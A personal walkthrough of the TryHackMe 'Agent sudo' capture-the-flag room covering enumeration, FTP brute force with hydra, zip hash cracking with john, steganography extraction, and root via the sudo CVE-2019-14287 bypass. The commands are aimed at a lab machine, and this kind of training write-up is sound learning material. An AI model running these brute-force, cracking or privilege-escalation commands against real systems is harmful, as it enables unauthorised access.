# Agent sudo | TryHackMe
# difficulty : easy

---

## 1 - enumeration

i ran a nmap scan

```
nmap -sC -sV 10.130.149.88
```

output :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

so i entered the web page and it said

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

so i figured i may need to change my user-agent to access the website , i'll use curl and try with agent R first

```
curl -A "R" -L http://10.130.149.88/
```

-A allows us to spoof the user-agent.
i got nothing from R , since i noticed the agent names are alphabets , i guess i have 25 more guesses - i'll try them.

```
[nexsis@archlinux agentsudo]$ curl -A "C" -L http://10.130.149.88/
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

we figured out the agent's name which is **chris**

---

## 2 - hash cracking and bruteforce

so i will bruteforce into the ftp using the username chris , and see what it will give us.

```
hydra -l chris -P /home/nexsis/Desktop/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt ftp://10.130.149.88
```

and got

```
[DATA] attacking ftp://10.130.149.88:21/
[21][ftp] host: 10.130.149.88   login: chris   password: #####
```

i'll login to ftp and see what i can get.
found 3 files :

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

i'll move all of the to my machine using the command `get`

```
[nexsis@archlinux agentsudo]$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

i'll download the pictures and check the filetype using the command *file* since the file extension may be changed

```
[nexsis@archlinux agentsudo]$ file cutie.png
cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
[nexsis@archlinux agentsudo]$ ls
agentsudo.md  cute-alien.jpg  cutie.png  To_agentJ.txt
[nexsis@archlinux agentsudo]$ file cute-alien.jpg 
cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
```

i guess cutie.png has hidden files , you can use **binwalk** , it didn't work well for me so i used :

```
foremost -i cutie.png
```

this is the output :

```
├── output
│   ├── audit.txt
│   ├── png
│   │   └── 00000000.png
│   └── zip
│       └── 00000067.zip
```

now it's time to crack the zip , first of all we will get the hash using zip2john :

```
zip2john output/zip/00000067.zip>hash.txt
```

let's crack the hash now using :

```
john hash.txt --wordlist=/home/nexsis/Desktop/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

*don't blindly copy-paste since directories are different between systems*

we found the password ! , now let's unzip it and see it's contents

```
7z x output/zip/00000067.zip -palien
```

-p for password btw
we found a "To_agentR.txt" , let's see it's contents:

```
[nexsis@archlinux output]$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

we see there is the hash "QXJlYTUx" , we need to figure out what type it is before cracking it.
i used https://www.tunnelsup.com/hash-analyzer/ , and it's base64 .
let's decode it :

```
echo "QXJlYTUx" | base64 -d
```

output : Area51

in the fourth question i was stuck for a while , but then when i look back at #3 i noticed it says steg password
so i tried all the files in https://futureboy.us/stegano/decinput.html + the password Area51 , and cute-alien.jpg gave me the hidden message.

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

---

## 3 - logging in

first i will login to the ssh using the username james and the password hackerrules! .

```
ssh james@10.130.188.116
```

now we got an ssh connection , i'll capture the user.txt flag.
there is this file Alien_autospy.jpg that i want to check , to upload it to my machine i used

```
python3 -m http.server 8080
```

(in the victims machine) then

```
wget http://10.130.188.116:8080/Alien_autospy.jpg
```

(in the attackers box)
i could've used scp but it's fine that worked too.
there's a really disturbing picture of an alien but ok - i will reverse search this picture in google the hint told me in foxnews .
answer is `Roswell alien autopsy`.

---

## 4 - Privilege escalation

i ran "sudo -l" to see what commands i can run with sudo :

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

as we can see we got bash, we found the cve in exploitdb it's `CVE-2019–14287`
let's exploit it using `sudo -u#-1 /bin/bash`
output :

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
```

and here we go ! We have a root shell.
i navigated to the root folder and got the root.txt flag.

```
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
#####################

By,
DesKel a.k.a Agent R
```

and agent R's name is **DesKel**

---

## Lessons learned

- ALWAYS keep your system updated.
